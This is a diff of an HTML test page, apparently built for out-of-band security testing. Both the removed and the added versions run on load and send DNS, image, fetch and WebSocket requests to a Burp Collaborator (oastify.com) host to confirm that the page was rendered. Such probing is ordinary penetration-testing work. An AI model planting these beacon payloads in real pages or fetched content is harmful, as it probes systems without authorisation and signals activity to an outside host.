@@ -1,54 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
-    
-    <!-- DNS Prefetch - triggers DNS lookup -->
-    <link rel="dns-prefetch" href="//dns.9hr2cmdiyzgs2i5tyvmh6jinye4ds3gs.oastify.com/">
-    <link rel="prefetch" href="http://prefetch.9hr2cmdiyzgs2i5tyvmh6jinye4ds3gs.oastify.com/">
-    
-    <script>
-        window.onload = function() {
-            var collaborator = '9hr2cmdiyzgs2i5tyvmh6jinye4ds3gs.oastify.com/';
-            
-            // Method 1: HTTP request (what you already have)
-            const img1 = new Image();
-            img1.src = 'http://' + collaborator;
-            
-            // Method 2: DNS via different subdomain HTTP requests
-            const img2 = new Image();
-            img2.src = 'http://dns1.' + collaborator;
-            
-            const img3 = new Image();
-            img3.src = 'http://dns2.' + collaborator;
-            
-            // Method 3: Fetch with different subdomains (triggers DNS)
-            fetch('http://fetch1.' + collaborator).catch(() => {});
-            fetch('http://fetch2.' + collaborator).catch(() => {});
-            
-            // Method 4: WebSocket attempt (triggers DNS)
-            try {
-                new WebSocket('ws://ws.' + collaborator);
-            } catch(e) {}
-            
-            // Method 5: Create multiple subdomains for DNS lookups
-            for(let i = 1; i <= 5; i++) {
-                const img = new Image();
-                img.src = 'http://sub' + i + '.' + collaborator;
-            }
-            
-            // Method 6: Dynamic DNS lookups with random subdomains
-            setTimeout(function() {
-                const randomSub = Math.random().toString(36).substring(7);
-                const img = new Image();
-                img.src = 'http://' + randomSub + '.' + collaborator;
-            }, 1000);
-            
-            document.body.innerHTML = '<h2>DNS + HTTP Payloads Triggered!</h2><p>Check Burp Collaborator for both DNS and HTTP requests!</p>';
-        }
-    </script>
+    <title>Debug Test</title>
 </head>
 <body>
-    <p>Loading DNS + HTTP payloads...</p>
+    <h2>Debug Test Page</h2>
+    <p>Page loaded successfully!</p>
+    
+    <script>
+        console.log('JavaScript is running!');
+        
+        // Simple image test
+        const img = new Image();
+        img.src = 'http://9hr2cmdiyzgs2i5tyvmh6jinye4ds3gs.oastify.com/test-image';
+        
+        // Log when image tries to load
+        img.onload = () => console.log('Image loaded');
+        img.onerror = () => console.log('Image failed to load');
+        
+        // Simple fetch test
+        fetch('http://9hr2cmdiyzgs2i5tyvmh6jinye4ds3gs.oastify.com/test-fetch')
+            .then(() => console.log('Fetch succeeded'))
+            .catch(() => console.log('Fetch failed'));
+        
+        // Display status
+        document.body.innerHTML += '<p>Requests sent! Check Burp Collaborator.</p>';
+    </script>
 </body>
 </html>
